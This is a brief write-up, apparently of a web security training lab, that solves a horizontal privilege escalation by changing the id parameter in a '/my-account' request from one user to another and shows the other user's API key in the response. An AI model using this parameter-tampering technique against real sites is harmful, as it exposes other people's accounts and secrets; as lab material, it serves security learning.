this lab a horizontal privilege escalation vulnerability on the user account page.

to solve this lab just we need to change the id from `wiener` to `carlos`.
```bash
GET /my-account?id=carlos HTTP/2
```

part from the response 
```html
<div>
	Your API Key is: SntHGmNjNn7LsBaJj5HK6FXweXYueueg
</div>
```

